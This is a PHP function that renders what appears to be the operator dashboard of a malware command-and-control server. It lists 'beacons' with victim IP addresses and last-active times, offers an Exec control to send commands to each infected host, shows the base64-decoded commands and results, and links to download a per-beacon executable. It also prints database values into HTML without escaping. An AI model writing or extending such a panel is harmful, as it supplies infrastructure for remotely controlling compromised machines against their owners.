<?php

function renderbeacons($db)
{
    
    $conn=$db;

    // Initialize the session
    session_start();

    // Prepare select statement
    $sql = "SELECT * FROM beacons";
    $stmt = $conn->query($sql);
    $beacons = $stmt->fetchAll(PDO::FETCH_ASSOC);

    // Print beacons
    foreach($beacons as $beacon)
    {       

        if($_SESSION["role"] != 1) 
        {
            $del=null;
        }

        else
        {
            $del="<td>
            <button onclick='delete_beacon(\"$beacon[beacon_id]\")' class='btn btn-danger'> Delete </button>
            </td>";
        }

        echo "
        <tr>
        <td>$beacon[beacon_id]</td>";
        echo "
        <td>$beacon[victim_ip]</td>";
        echo "
        <td>$beacon[last_active]</td>";
        echo "
        <td>
        <input id='command'>
        <button onclick='command_beacon(\"$beacon[beacon_id]\")' class='btn btn-primary' name ='exec'> Exec </button>
        </td>";
        echo "
        <td>" . base64_decode($beacon["command"]). "</td>";
        echo "
        <td>" . base64_decode($beacon["result"]) . "</td>";
        echo "
        <td>
        <a href=\"$beacon[beacon_id].exe\" download=\"$beacon[beacon_id].exe\" class='btn btn-success' name ='exec'> GET </a>";
        echo $del;
        echo "</tr>";
        
        
        
            
    }

}